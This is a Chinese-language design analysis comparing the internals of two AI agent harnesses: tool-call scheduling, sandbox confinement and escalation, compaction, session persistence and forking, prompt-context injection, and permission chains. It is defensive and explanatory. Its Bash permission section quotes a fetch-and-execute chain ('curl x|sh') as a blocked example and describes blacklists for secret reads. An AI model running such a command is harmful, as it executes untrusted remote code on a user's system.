一个 assistant 消息可能带多个 tool call。它们有的能并行（读文件），有的不能（写文件、问用户）。dsh 的调度器要在保证**结果顺序与模型输出顺序一致**（否则 transcript 无法复现）的前提下，尽可能并行。

###### 核心数据结构（`tool-calls.ts:26-39`, `:133-141`）

```ts
Slot[]          // 按模型序的槽位，index 对齐 group
callSeqs[]      // 每个已启动调用的 tool/call seq（供结果引用）
nextToStart     // 下一个待启动
committed       // 已提交的前缀长度（只沿连续槽位推进）
started         // 已启动数
inFlight: Map<index, Promise<index>>
```

###### 算法：分组 → 池 → 屏障

```
executeToolCalls:                                        tool-calls.ts:60
 while next < planned.length:
   mode = ctx.tools.executionMode(planned[next])
   group = mode==='parallel' ? planned.slice(next) : [planned[next]]
   outcome = await runGroup(group, mode)
   next += outcome.consumed
   if (outcome.aborted) { 给剩余调用补合成 tool/call+result；return }
```

```
runGroup（并发模式）:                                     :122
 fillPool(): while 未中止 && 有剩余 && inFlight.size < maxParallelToolCalls:
   ├─ 若 nextToStart>0 且后续调用的 mode 变成非 parallel → break（形成屏障）
   ├─ await startCall(nextToStart)      ← 含 prepare（有序！可 await 策略/审批）
   ├─ await commitReady()               ← 按序提交已完成的结果与上下文
   └─ 检查中止
 while inFlight.size>0:
   ├─ await Promise.race(inFlight.values())  ← 谁先完成先收
   ├─ await commitReady()                    ← 但只提交"连续的"前缀
   └─ fillPool()
```

###### 三条关键不变量

| # | 不变量 | 强制点 |
|---|---|---|
| I1 | `committed` 只跨**连续**模型序槽位推进（后续完成但前面没完成 → 不提交） | `:147-161` |
| I2 | 并发上限每次从 `ctx.agentLoop.config` **重读**（配置变更对下一个 group 生效，不打扰在飞的 group） | `tool-calls.ts:132` + `agent-loop/index.ts:393-398` |
| I3 | 中止时：已启动的调用**提交真实结果**，未启动的补**合成错误结果** | `:238-243`, `:250-260` |

I2 的实现细节很讲究：`config` 上用了一个 **getter**（`index.ts:396-398`）而不是快照字段，注释说明原因是"tool-calls.ts 在每个 group 开始时解构它"。

###### 调度器失败 vs 中止：两种收场（`:232-236` vs `:238-243`）

- **中止**（abort）：给未启动的调用合成结果 → 保证日志可复现；
- **调度器内部失败**：`Promise.allSettled(inFlight)` 等已启动的排干，**不合成任何结果** → 保留已记录的 `tool/call` 事件，如实暴露"有调用被记录了但没有结果"。

这个区别的实质是：**中止是预期事件（要能续），失败是异常（不能粉饰）**。

###### `executionMode` 的 fail-closed 设计（`:1267-1276`）

```ts
const tool = this.resolveExecution(...)
if (!tool?.isConcurrencySafe) return { kind:'exclusive' }   // 未声明即独占
try { return tool.isConcurrencySafe(args) === true ? parallel : exclusive }
catch { return { kind:'exclusive' } }                        // 判定抛错也独占
```

**只有精确返回 `true` 才并行**。默认、未知、抛错一律独占。这是典型的 fail-closed。

###### 对照提示

XEYO 的并发在 `python/tools/orchestration`（信号量，默认 10，对应 `maxParallelToolCalls`）。XEYO 的 `TOOL_META` 里有 `concurrency_safe` 字段（第四轮已列），注册期有硬失败校验。差别在**屏障语义**：dsh 允许"前面并行、遇到独占调用即形成屏障"，XEYO 是整批并发。另外 XEYO 没有"中止时补合成结果"这一层——它的 `incomplete_tool_uses` 记录在 `.turn.json` 里（见 A-2 对照）。

---

##### A-8 沙箱 confine 机制：一个函数把政策编译成 argv

###### 设计意图

沙箱的全部抽象只有一个方法（`sandbox/src/index.ts:158-176`）：

```ts
abstract confine(argv: readonly string[], policy: SandboxPolicy): ConfinedArgv
```

输入是**调用方本来要 spawn 的精确 argv**（注释强调：不是 shell 字符串，shell 型调用方应传 `['bash','-c',command]`），输出是**应该改 spawn 的 argv** + 强制完整度 + 拒绝签名 + runner 失败规则。

###### 不变量：静默裸跑被禁止

类注释（`:152-157`）原文：

> *"{@link confine} must return enforcing argv or fail closed at wrap or runner-execution time; **silent unconfined passthrough is forbidden**."*

强制手段（`:126-144`）：无后端可用时抛 `SandboxUnavailableError`，携带 code `SANDBOX_UNAVAILABLE` 经 `tool/result` 的结构化错误通道传给调用方。错误文案直接告诉用户怎么办（装 bwrap / 用 Landlock 内核 / 检查 sandbox-exec / 检查 Windows ACL runner / 或者显式切到 `danger-full-access`）。

###### 政策结构（`:39-72`）

```ts
SandboxExecutionPolicy {
  mode: 'read-only' | 'workspace-write' | 'danger-full-access'
  workspaceRoot: string          // 即使当前模式不用也带着（调用方先解析一次再选路径）
  sessionId?: SessionId          // 后端据此挂每会话状态（Windows ACL 的随机私有临时目录+SID）
}
```

注释（`:61-68`）明确：政策是**每次调用携带**的，不是固定在后端上——因为"两个消费者可能同时用不同政策 confine"（bash 只读，同时受限子 agent 需要自己的状态目录可写），且"一次被批准的升级重试是新的一次调用"。

###### 平台后端与拒绝方言

`ConfinedArgv` 返回的 `denialSignatures`（`:100-108`）是一处很细的设计：**每个后端有自己的拒绝方言**——bwrap 用 EROFS 文案、Landlock 用 EACCES、Seatbelt 用 EPERM。注释强调消费方必须匹配**本后端的方言**而不是跨后端并集：*"the union claims denials a given backend never produces."*

`enforcement` 字段（`:54-59`）区分 `full / partial`：`partial` 表示"当前后端或较老内核 ABI 无法治理所有承诺的文件效果"——注释提醒需要绝对边界的调用方**不能把 partial 当 full**。

###### runner 失败判定（`:74-88`）

`RunnerFailureRule` 的顺序被明确固定：
1. 先按 `allowedExitCodes` 过滤（缺省允许任意非零）；
2. 再按 `informationalLines` **逐行精确相等**剔除无害输出；
3. 最后在每个剩余 stderr 行里**大小写不敏感**匹配 `fatalSignatures`。

注释（`:79-80`）：*"Exit status alone never proves runner failure."* —— 退出码非零可能是被沙箱**正确拒绝**了，不一定是沙箱自己坏了。区分这两者是"沙箱没装上"与"沙箱装上了并且拦住了"的分界。

###### 升级阶梯（`escalation.ts`）

```ts
WIDER_MODES = {
  'read-only':       ['workspace-write', 'danger-full-access'],
  'workspace-write': ['danger-full-access'],
}
ESCALATION_TARGETS = ['workspace-write', 'danger-full-access']   // 封闭词汇，不因默认档而裁剪
```

`approveEscalation`（`:157-189`）是**有序的 fail-closed 序列**：

```
1. 严格放宽检查（对"本次调用的有效模式"检查，不是对 schema）→ 不满足即抛，且不提示人工
2. 无审批服务 → 抛
3. 无 agent（无会话可审计/可路由）→ 抛
4. 走审批请求
5. outcome 映射：allowed-once → 放行；rejected/cancelled/unavailable → 三种不同文案
```

三处设计理由（注释原文）：

- `:22-27`：宽化表"**在 EXECUTION 检查，绝不烤进工具 schema**"——因为 schema 是**注册表全局**的，而有效模式是**每次调用**的真值。
- `:33-40`：`ESCALATION_TARGETS` 是封闭词汇，不裁成"比默认档更宽的那些"——否则默认 `danger-full-access` 的部署会**什么都广告不出来**，而会话切窄之后就没有杠杆了。
- `:44-61`：`sandbox_permissions` 与 `justification` **必须同时出现**（"无理由的审批提示，或驱动不了任何东西的理由，都是畸形提问"），且理由必须是非空句子。

###### 面向模型的标记（`:63-86`）

```
sandboxDenialMarker(mode)  = '[sandbox: file access denied under <mode> mode]'
escalationHintMarker(s)    = '[sandbox: escalation available — retry this exact <s> once with sandbox_permissions …]'
```

注释（`:75-83`）：同轮升级提示**骑在被拒结果上**，"so the sanctioned retry does not depend on the model recalling the tool description"——把提示放在决策点，而不是指望模型记住工具描述。**这是 dsh 唯一一处明确的"模型可见文本带行动指引"**，但它的对象是"被拒绝的动作该走哪条合法路径"，属于对拒绝事实的补全，不是路线编排。

###### 对照提示

XEYO **没有这一层**。全仓 `landlock|seatbelt|bubblewrap|bwrap|sandbox-exec` 零命中（第四轮已复核）。XEYO 只有：
- Windows Job Object（资源限额，**非隔离**）——用于 TUI/终端；
- TerminalBench 场景的 docker 容器路由（评测旁径，`TerminalBench/xeyo_harbor_agent.py`）；
- `permissions/filesystem.py` + `write_scope.py` 的**路径级**写范围限制（在 Python 进程内，不是内核级）。

即：XEYO 的"隔离"是**协商式的**（进程自己遵守），dsh 的是**强制式的**（内核/ACL 执行）。

---

##### A-9 压缩事务机制：括号事务 + 工具配对平衡 + 影子计价

###### 设计意图

上下文满了要压缩。dsh 的压缩不是"删几条消息"，而是**一次日志事务**：写入 `compaction/start` → `compaction/summary` → 替换表面 → `compaction/end`。整个过程可中断、可重入检测、可失败回滚。

###### 为什么必须是事务

因为**总结是一次 LLM 调用**——异步、可能几十秒。在这期间会话可能又有新事件、表面可能被改写。如果总结基于旧表面却应用到新表面，就会覆盖掉新内容。所以必须有"开括号 / 闭括号"和一个**稳定性检查**。

###### 算法：`compactSurfaceRegion`（`region.ts:154-256`）

```
1. 只读校验（同步）：validateSurfaceRegion           ← 起止 seq 在表面上、起止是"工具配对平衡"的切点
2. 入口态检查：inspectCompactionEntryState            ← 从日志尾部倒扫，取 openTurn / 未匹配 start / 最新 seed 边界
3. assertCompactionInactive                            ← 有未匹配 start 且无更新的 seed 边界 → busy 拒绝
4. owner 判定：current-turn 必须有开着 turn；null 不许有开着 turn
5. append('compaction/start')  ← ★ 同步紧跟校验，它就是"压缩锁"
6. try:
     ├─ prepareCompaction：用 token meter 量表面，切片，比对阴影 seq 是否仍一致（SurfaceChangedError）
     ├─ await summarize(...)  ← 唯一的长异步
     ├─ assertStable（whole-surface 或 selected-span 二选一）
     ├─ append('compaction/summary')
     ├─ append('user/message'(checkpoint), { surfaceOp:{op:'replace',start,end},
     │                                        sourceEventSeqs:[start,summary,...shadowed] })
     ├─ append('compaction/end')
     └─ completeCompaction
7. catch: 记录 stage（summary/commit），若未在关闭中则 append('compaction/end', {error}) 
8. 可选 flush（耐久性检查点）
9. 按 owner 类型抛不同错误（manual 走 ManualCompactionError 分类）
```

###### 压缩锁的实现（`:191` 注释原文）

> *"Idle/log validation and `compaction/start` are synchronously adjacent, so the durable opening marker is the compaction lock before summarization yields."*

即：**没有单独的锁文件**——"日志里有一条未匹配的 `compaction/start`"本身就是锁。崩溃后这个未匹配标记还在，下次启动就能检测到（`assertNoActiveCompaction` 供异步决策后重新检查，`:307-314`）。

###### 工具配对平衡（`tool-pairing.ts`）

压缩切点不能切在"模型刚请求了工具、结果还没来"的中间。判定用**增量计数**：

```ts
eventDelta(event):
  assistant/message → +该消息里 tool-call 块的数量
  tool/result       → -1
  其他              → 0

沿表面折叠，任何时候计数 < 0 → 抛"corrupt surface"
每次计数回到 0 → 这个"切"是平衡的
```

缓存按 `(session, replaceGeneration)` 组织（`:26, :71-91`），表面被替换（generation 变）就整体重建。注释（`:48-49`）：看不见的尾部**先验证再落缓存**，"so a corrupt append cannot leave a partially advanced state behind"。

###### 影子计价（`region.ts:340-364`）

```ts
shadowedTokenCount      = Σ heuristicTokens    ← 固定启发式价
shadowedRouteTokenCount = Σ tokens             ← 路由实价
```

注释（`:356-359`）：*"The shadow-price protocol prices replacements with the fixed heuristic so the O(1) projection fold stays in agreement with its own appends; retention, range selection, and the shrink comparison read the route-priced `tokens` instead."*

即：**投影折叠必须用固定价**（因为要 O(1) 且与 append 一致），但**决策**（保多少、切哪里、够不够小）用**路由实价**（更准）。

收缩判据（`:383-388`）：
```
framedSummaryTokenCount >= shadowedRouteTokenCount → 抛"summary is not smaller than the shadowed content"
```
注释（`:380-382`）：checkpoint 是纯文本，所以它的启发式价**就是**路由价，直接比就回答了真问题——"替换后下次请求压力是不是更小"。

###### 稳定性检查的两种模式

| 模式 | 含义 | 用途 |
|---|---|---|
| `whole-surface` | 整张表面必须与总结前**深相等** | 手动压缩（会话空闲，要求严格） |
| `selected-span` | 只要求被选中的那一段仍存在、连续、等价的替换目标 | 自动压缩（开着 turn，允许别处新增） |

`selected-span` 的注释（`:408-412`）：*"Nodes added outside it remain visible and do not invalidate the summary."* —— 这是为了让自动压缩能在 turn 进行中工作。

###### 对照提示

XEYO 的对应物是 `engine/compact.py`（353 行）：`tool_pair_ranges` / `keep_tail_cut` / `project` / `project_incremental`。XEYO 也有**工具配对**概念（`_assistant_tool_ids` / `_tool_result_ids`）——两端独立演化出了同一条约束。

差别在**事务性**：XEYO 的压缩是**内存投影 + 可选 LLM 摘要**（C2），**不写日志、不落锁、无括号**。所以 XEYO 在压缩过程中崩溃 → 没有痕迹，下次从头再压；dsh 崩溃 → 留下未匹配的 start，下次能识别并处理。

这是"事件溯源"给压缩带来的直接红利。

---

##### A-10 会话持久化机制（JSONL）：写后缓冲 + 单写者 + 撕裂尾修复

###### 设计意图

`Session.append()` 的注释（`core/session/src/index.ts:664-668`）写明：**热路径绝不阻塞在 I/O 上**，持久化插件异步缓冲。于是有了"写后缓冲"这个机制。

###### 算法：一条事件怎么走到磁盘

```
Session.append → log.push → 同步派发 session/event
                              ↓
JsonlBackendTracker.install 里注册的监听器：        storage.ts:501-505
  writers.get(session.id)?.enqueueLive(event, ...)
                              ↓
JsonlSessionHandle.enqueueLive:                      storage.ts:240-247
  buffered.push(structuredClone(event))             ← 存"持久化自己的副本"
  if (无 batchTimer && 未暂停) batchTimer = setTimeout(drainLive, 200ms)
                              ↓
drainLive / drainBuffered:                           storage.ts:254-282
  单飞（this.draining ??= …）
  while buffered.length > 0:
    enqueueChain(async () => {
      batch = buffered.splice(0)      ← 只有这个单飞 drain 会 splice
      try  persistContiguous(batch)
      catch { buffered = batch.concat(buffered); drainPaused = true; throw }
    })
                              ↓
persistContiguous:                                   storage.ts:285-309
  1. 非写句柄 → SessionReadOnlyError
  2. ensureLease()  ← 首次写前拿跨进程写锁
  3. assertContiguous(id, batch, cursor)
  4. 若有待处理撕裂尾：truncateTornTail → 再 persistBatch(recoveredTail)
  5. persistBatch(batch)
  6. materialized = true; cursor += batch.length; primed = undefined; observedLength = cursor
```

###### 不变量

| # | 不变量 | 强制点 |
|---|---|---|
| I1 | 一个 session id 在进程内**只有一个写句柄**（`writers` map + `SessionAlreadyOwnedError`） | `storage.ts:395-398, 450` |
| I2 | 一个句柄的**所有变更串在一条 promise 链上**（`chain`），永不 reject（`chain = next.catch(()=>{})`） | `:323-327` |
| I3 | 读操作的返回长度**不得变小**（`observedLength` 单调） | `:141-144` |
| I4 | 批次必须与 `cursor` 连续（`assertContiguous`） | `:289` |
| I5 | 关闭是幂等的（`this.closing ??=`），且关闭前必须 drain 到缓冲为空（循环，因为别的 fiber 可能还在 publish） | `:189-206` |

###### 撕裂尾（torn tail）修复机制

崩溃可能留下"半行 JSON"。处理方式是**三段式**（`:290-303`）：

1. `tornTruncateTo` → 先截断坏字节；
2. `recoveredTail` → 把从坏行里**恢复出来的完整事件**重新写一遍；
3. 然后才写新批次。

每一步完成后才清掉对应状态（注释 `:290-293`：*"clearing each step's state only once it lands so a failed step retries on the next mutation"*）——即**幂等重试**，不怕中途再崩。

###### 跨进程写租约

`ensureLease()`（`:318-320`）在**第一次真正落盘前**拿锁（不是构造时）。注释（`:311-317`）：*"a create handle acquires it here — immediately before the first log bytes publish — and keeps it through close even when materialization then fails, so a materializing session stays exclusively owned across retries."*

这条设计防的是竞态：两个进程同时 create 同一个 id，谁先写出第一个字节谁拥有。

###### 对照提示

| 维度 | dsh | XEYO |
|---|---|---|
| 热路径 | 不阻塞，200ms 批量 | 直接写（`session/persistence.py`）+ 可选 fsync |
| 并发保护 | 单写者句柄 + promise 链 + 跨进程租约 | 进程内 RLock（`rewind/revision.py:20-26`） |
| 撕裂行 | **显式修复**（截断+重写恢复事件） | **静默跳过**（`journal.py:97-115`：坏行 `continue`） |
| 副本策略 | `structuredClone` 存自己的副本 | 无（直接序列化当前对象） |
| 关闭语义 | drain 循环直到空 + 聚合失败 | 无显式 drain |

两端对"坏行"的态度是两种哲学：dsh **尽量救回**（能解析出的部分重写），XEYO **直接放弃**（注释说"进程被杀可能留下最后一行残页：解析失败的行直接跳过即可"）。

---

##### A-11 会话 fork / 继承机制：用一条计数切开"父的"与"我的"

###### 设计意图

fork 一个会话（从某个点分叉）在事件溯源系统里很微妙：子会话的日志包含父会话的前缀。如果子会话把整段前缀当"自己的"，那"我这个会话一共发生了什么"就答不出来，`firstLiveSeq`/压缩/审计全都会算错。

dsh 用**两个不同的计数**分别回答两个不同的问题（`index.ts:479-502` 的注释值得整段引用）：

| 字段 | 回答的问题 | 语义 |
|---|---|---|
| `firstLiveSeq` | **本进程**从哪个 seq 开始写 | 构造种子（replay/fork/resume）的长度；**不持久化**，靠 `session/end-seed` 事件投影到日志 |
| `inheritedEventCount` | **fork 血缘**切在哪 | 持久化在 header 里；resume 时保持原 fork 值不变 |

注释明确点出两者的差别：*"a resumed session's constructor seed is its full stored log, while the inherited count keeps the original fork value — this field is the in-process construction fact."*

###### 算法：构造时的多重校验（`:541-608`）

```
1. restore 模式 → validateRestoredSessionHeader
2. 逐个 seed 事件：
   ├─ snapshotJsonValue（无损 JSON）
   ├─ assertSessionEventEnvelope
   ├─ seq 必须 == index（从 0 连续）
   └─ surfaceManager.validateNext（表面合法性）
3. firstLiveSeq = log.length
4. seeded 但没有 seed → 抛
5. seeded 但没有 inheritedEventCount → 抛
6. 非 seeded 但 inheritedEventCount !== 0 → 抛
7. inheritedEventCount > log.length → 抛
8. snapshot 模式 && seeded && inherited !== log.length → 抛
9. 补 session/end-seed 标记（fresh seeded child 必带；restore 只在末尾不是该类型时补）
```

第 8 条是核心约束：**fresh fork 的种子必须恰好等于继承前缀**（不能"多拷贝一段又不认它是继承的"）。

###### fork 的拒绝码（`:857-870`）

```ts
SessionForkErrorCode = 'SESSION_NOT_FOUND' | 'SESSION_NOT_LIVE' | 'SESSION_ALREADY_EXISTS'
                     | 'INVALID_BOUNDARY' | 'OPEN_TURN'
```

`OPEN_TURN` 单列一条：**不能在 turn 中间分叉**——否则 fork 出来的历史里有一个没有结尾的 turn，provider 会拒绝。

###### `session/end-seed` 的用途

它是一个**日志里的界碑**，让"只读存储历史"的消费者（没有内存对象）也能找到"种子到哪结束"。压缩的入口态检查就读它（`region.ts:535-537`）：`latestEndSeedSeq > 未匹配start.seq` 说明那个未匹配的 start 属于**上一个生命周期**，不是当前这把锁。

###### 对照提示

XEYO 有 `rewind/revision.py::truncate_to`（"创建新 head 恰好包含目标 revision"），语义接近"分叉到某个点"，但它是**revision 层面**的，不是会话 ID 层面的。XEYO **没有会话级 fork**（第四轮已复核）。XEYO 的 `rewind/revision.py` 保存了 `parent_revision_id`，形成一棵 revision 树——这是"分叉"的另一种表达。

---

#### Part B — XEYO 实现机制设计说明

##### B-1 T_now 注入管线：把易变内容挡在 system 前缀之外

###### 设计意图

system prompt 是 KV 前缀缓存的头部，一次字节变化整段缓存失效。但 Agent 每轮都有易变事实（预算水位、工具面变更、文件冲突、续跑指令）——既必须让模型看到，又不能写进 system。

`prompt/turn_context.py:1-7` 的模块 docstring 就是这条设计的原始表述：

```
"""本轮易变上下文：挂到投影最后一个 user 的尾部（T_now），不进 system 左段。

模式说明、已批准计划、预算提示、MEMORY 索引等易变内容放这里，
避免打爆 system 前缀的 KV 缓存。
```

###### 三类块（为什么要分类）

`prompt/pre_llm_inject.py:1039-1040` 注释原文：

> P1/F3：所有块以 (类别, 文本) 装配；类别决定放置（A1）、门控（D1）与预算（F1）。新增块必须声明 `KLASS_*`，遗漏按 INVENTORY 处理（最保守）。

| 类别 | 常量（`pre_llm_inject.py:80-82`） | 预算待遇 | 门控 |
|---|---|---|---|
| directive | `KLASS_DIRECTIVE = "directive"` | **永不裁剪**（构造处各自有界，`:996-997`） | 绝不静默 |
| event | `KLASS_EVENT = "event"` | 永不裁剪 | **绝不静默**（drain 语义，静默即永久丢） |
| inventory | `KLASS_INVENTORY = "inventory"` | 填 `min(2500, 6000-已用)` 配额 | 模糊指代轮**整体静默** |

###### 装配：唯一入口

`_tag_block(tagged, name, block)`（`:922-930`）是所有装配点的唯一通路：

```python
def _tag_block(tagged, name, block) -> None:
    """装配点统一入口：登记名进代码（执法测试解析对象）+ 块级旁路。"""
    if name in _skipped_blocks():
        return
    tagged.append(block)
```

它同时承担两件事：把**登记名**写进代码（供机器执法解析），以及消费 `XEYO_T_NOW_SKIP` 消融名单（`:917-919`）。实测 20 个装配点与登记表 20 条一一对应；执法测试直接断言源码里不存在裸 `tagged.append(`——这正是"登记名必须出现在代码里"的意义。

###### 三层预算

| 常量 | 值 | 作用 |
|---|---|---|
| `T_NOW_TOTAL_BUDGET` | `6_000` | 全部块总量硬顶 |
| `T_NOW_INVENTORY_MAX` | `2_500` | inventory 类配额上限 |
| `T_NOW_EXTRA_BUDGET` | `6_000` | 旧路径 `_trim_blocks_to_budget` 的独立预算 |
| `NESTED_MAX_CHARS` | `4_000` | 嵌套 XEYO.md 单块上限 |
| `T_NOW_BLOCK_HARD_CAP` | `21` | 登记条数硬顶（注释记 **23→21**：裁决 5 删 `stale_xeyo_md`/`nested_change` 两块） |

`_trim_tagged_blocks`（`:990-1027`）算法：

```
1. 遍历 tagged：inventory 归 inv；其余归 kept 并累加 used
2. room = max(0, min(inventory_max, total - used))
3. 按装配序填 inv：
   ├─ len(b) <= room → 收，room -= len(b)
   ├─ room >= 64       → 截断到 room + "…"，room = 0 后停止
   └─ 否则             → break（剩余不足 64 → 整块丢弃）
```

**"剩余 < 64 整块丢弃"是本机制最见功夫的一处**：宁可整块不给，也不给模型一个 20 字的残块——残块比没有更坏（模型会把它当完整事实）。

###### D1 模糊指代轮门控

`:1312-1315` 注释原文：

> P1/D1：模糊指代轮静默全部 INVENTORY。事件/指令绝不静默：notices / settlements / reconcile 有 drain 语义，静默即永久丢失。

识别在 `_is_vague_referent_turn`（`:966`）：仅 fresh-user 轮 + 确有上文才判；`_VAGUE_ACK` 24 个确认词 + `_VAGUE_MARKERS` 24 个模糊动词 + 长度 ≤ `_VAGUE_MAX_CHARS=24` + 无 `_VAGUE_CODE_MARKERS`。注释写明 fail-open：*"误判只丢一轮参考数据；指令/事件永不受影响"*。

###### 失败路径

- `XEYO_T_NOW_SKIP` 命中块名 → 该块不装配（消融测试用，`:922-929`）
- `forced_wrap_up` 兜底（`:1320-1327`）：trim 之后若 wrap_up 块被裁则**强挂一次**（去重）——注释解释挤掉它的后果：*"模型只看到'没有工具'却不知道要立即作答，空响应/硬停概率上升"*

###### 对照提示

dsh 没有等价物。最接近的是 A-5 运行上下文快照——也是"易变事实进上下文不破坏缓存"，但形态相反：dsh 是 **seam 插件 + 差异才发 + 被替换即撤销**（`runtime-context.ts`），XEYO 是**单管线 + 分类预算 + 登记表执法**。dsh 用类型系统约束结构，XEYO 用测试断言约束纪律。

---

##### B-2 env_channel 声道：伪造一对只存在于投影的 tool 对

###### 设计意图

`prompt/turn_context.py:119-129` 的 docstring 是这条机制的完整自陈，整段引用：

```
方案 A（环境声道）：内部格式为 assistant(tool_use 块) → user(tool_result
块)，经 normalize_messages_for_openai 转成标准 assistant(tool_calls)
→ tool 消息。tool_result 是模型训练出的「环境数据声道」——注入内容与
用户意图在消息结构上隔离，说话人混淆无从发生。工具名（xeyo_env_notice）
不注册进 tools 数组（schemas 冻结红线不受影响）；尾部追加不改前缀字节，
KV 缓存语义与 legacy 尾插等价。

copy-on-write：不修改入参列表与既有消息对象，绝不进 MessageStore / JSONL。
```

一句话：**引擎的注入文本不能伪装成用户说的话**。tool_result 在模型训练分布里就是"环境回传的数据"，用它承载注入，结构上就不可能与用户意图混淆。

###### 算法：一对消息的构造（`:130-160`）

```python
t = (text or "").strip()
if not messages or not t:
    return messages                       # 空则原样返回，不产生半态
from prompt.t_now_strategy import ENV_TOOL_NAME, new_env_tool_call_id
call_id = new_env_tool_call_id()
pair = [
    {"role": "assistant", "content": [
        {"type": "tool_use", "id": call_id, "name": ENV_TOOL_NAME, "input": {}}]},
    {"role": "user", "content": [
        {"type": "tool_result", "tool_use_id": call_id, "content": t, "is_error": False}]},
]
return [*messages, *pair]                  # 尾插，不改既有对象
```

三个不变量：
1. `ENV_TOOL_NAME` **不注册进 tools 数组**（`:124-125` 明写：schemas 冻结红线不受影响）
2. 尾插不改前缀字节 → KV 缓存语义与 legacy 尾插等价
3. copy-on-write，**不进 MessageStore / JSONL**（投影-only）

###### 策略分派（`:1336-1358`）

```
strategy = ctx.strategy or t_now_strategy()      # 显式 > 环境变量 > 默认
├─ STRATEGY_PREFILL → 回落 STRATEGY_ENV_CHANNEL（预留档，实测未过）
├─ STRATEGY_SKIP    → return out（本轮不注入）
└─ STRATEGY_ENV_CHANNEL → format_env_notice(kept) → append_env_notice_pair
legacy 路径（仅 after_tools 与合成分仓）：
   ├─ after_tools → append_text_blocks_to_last_user（Continue 在前）
   └─ fresh-user  → inventory 前插（prepend_text_blocks_to_last_user）
                    directive/event 尾插（append_text_blocks_to_last_user）
```

优先级链：会话/请求显式（`set_t_now_strategy`）> `XEYO_T_NOW_STRATEGY` > 默认 `env_channel`。

###### 失败路径：不落回 legacy

`:1340-1344` 注释是这条机制最重要的安全边界：

> L2（2026-09-09）：厂商拒绝伪造 tool 对时本轮不注入，**绝不落回 legacy 用户尾插**（引擎文本进用户角色 = 说话人混淆源）。执行层硬约束（预算/回合/wrap 门）不依赖提示文本。

也就是说：`SKIP` 档的代价是"模型这轮看不到易变块"，而不是"悄悄退回一个已知有缺陷的声道"。厂商侧结构类 4xx（400/404/413/415/422）被拒且未吐 chunk 时，引擎记进程级备忘并当场以 legacy 重建重试——但那是**厂商兼容**路径，不是默认降级。

###### 对照提示

dsh 的对应机制是 A-5：把易变事实做成**可替换的 user 消息**（`runtime-context.ts`）。两侧都独立得出"不能碰 system 前缀"，但载体选择相反——dsh 用 user 角色（可替换、有撤销语义），XEYO 用伪造的 tool 对（结构隔离、只追加）。**这是同一问题的两种不同答案，不是同一答案的两种实现。**

---

##### B-3 权限判定链：先硬拦（不可被授权穿越）再分派

###### 设计意图

`evaluate_policy`（`:1319-1388`）与 `evaluate_policy_impl`（`:1391-...`）被刻意拆成两层：

- **内层 `_impl`**：纯判定，含全部 DENY 硬拦。终态返回，不看 grant。
- **外层**：只有内层给出 `ASK` 时才叠加 always-allow grant。

`:1327-1332` docstring：

```
评估工具是否允许 / 需要确认 / 拒绝（T10：外层叠加 grant store）。

ASK 先查 always-allow 授权（"don't ask again"）：命中 → ALLOW(matched_rule=
"grant_store")。守卫：DENY 不可被 grant 触碰（impl 已终态返回）；worker
写作用域 / 远程会话 / permission_mode=always（显式逐条确认意图）一律跳过。
```

**"DENY 不可被 grant 触碰"是结构性的，不是靠分支判断的**——因为 `:1336` 第一行就是 `if decision.decision != PermissionDecision.ASK: return decision`。

###### 判定顺序（`evaluate_policy_impl`，逐分支）

| # | 条件 | 结果 | 行 |
|---|---|---|---|
| 1 | `raw_name in pol.deny_tools` | DENY `policy_deny_tool` | `:1404-1410` |
| 2 | `raw_name.startswith("mcp__")` | 转 `_evaluate_mcp` | `:1413-1414` |
| 3 | `raw_name == "Mcp"` | 转 `_evaluate_mcp_gateway` | `:1418-1419` |
| 4 | `raw_name in _ALWAYS_ALLOW` | ALLOW `tool_unrestricted_p0` | `:1421-1426` |
| 5 | `raw_name in _OUTBOUND_ASK_TOOLS` | 路径校验 → DENY / max 档 ALLOW / 否则 ASK | `:1429-1474` |
| 6 | `raw_name in _UI_ASK_TOOLS` | 转 `_evaluate_ui_ask` | `:1477-1478` |
| 7 | `raw_name == "Agent"` | always 档 ASK，否则 ALLOW | `:1481-1493` |
| 8 | `raw_name == "Bash"` | 转 `_evaluate_bash` | `:1495-1500` |

###### Bash 的 11 级链（`:822-1013`）

docstring 自己就是顺序表（`:828`）：

> 黑名单 DENY → 密钥 DENY → 规则 DENY(T7) → 策略文件 DENY → 仓库/远程策略 → peer git → 只读白名单(规则驱动) → 规则 ASK(T7) → 写目标证明 → 默认 ASK

| 级 | 判定 | 结果 |
|---|---|---|
| 1 | `bash_deny_reason` / `bash_deny_extra` | DENY（黑名单 / 仓库 `deny_commands`） |
| 2 | `bash_secret_read_reason` | DENY（密钥路径） |
| 3 | `bash_rule_ask_deny == "deny"` | DENY（T7 前缀规则） |
| 4 | `_bash_touches_policy_file` | DENY（Bash 不得改写 `.xeyo-policy.json`） |
| 5 | `_peer_bash_conflict` | 三选 ASK（多会话交叉） |
| 6 | `bash_mode == "deny"` 或 remote deny | DENY |
| 7 | `get_write_scope() is not None`（worker） | remote→DENY / 只读→ALLOW / 其余 DENY，**永不 ASK** |
| 8 | `bash_mode == "ask"` 或 remote | ASK |
| 9 | `rule_ask_deny == "ask"` | ASK |
| 10 | `bash_readonly_allow` | ALLOW |
| 11 | `_bash_writes_file` → 写目标证明 | 证明失败 DENY / 越界拦 / 危险路径 ASK / 否则 ALLOW |
| 12 | `is_max_permission_mode()` | ALLOW（max 档免确认） |
| 13 | 兜底 | ASK |

第 6 级旁还有一个**安全默认**（`:874-881`）：`bash_mode == "allow"` 时若既无 `XEYO_BASH_UNSAFE_ALLOW=1` 也不是 `full` profile，**自动降回 `default`**。注释：*"无 OS jail 时不允许 bash:allow 自动放行一切"*——这是"没有沙箱就不给全权"的直接代码化。

###### grant 叠加的 5 条守卫（`:1338-1370`）

| 守卫 | 理由 | 行 |
|---|---|---|
| `get_write_scope() is not None` | worker 沙箱：grant 不得放宽 | `:1342-1343` |
| `is_remote_session(...)` | 远程会话不得静默放行（§34 不变量） | `:1344-1345` |
| `permission_mode() == "always"` | 用户显式要求逐条确认 | `:1346-1347` |
| Bash 且 `bash_command_is_composite(cmd)` | G29：`git status && curl x\|sh` 不能蹭 `git status` 授权 | `:1350-1362` |
| `fp` 为空 | fail-safe，不落 grant | `:1369-1370` |

###### 对照提示

dsh 的权限是**预设驱动的策略档**（A-6/A-8），判定在工具瀑布的 pre-execute 阶段；XEYO 的权限是**按工具名分派的长链**，判定在工具运行时之前，且链上有 11 级"越往后越松"的阶梯。差异的根源：dsh 有沙箱兜底，所以策略可以粗；XEYO 没有沙箱，所以策略必须细——**XEYO 的 11 级链是"没有沙箱"这个事实的补偿物**。

---

##### B-4 Bash 策略：正向白名单 + 否定式复合拒绝

###### 设计意图

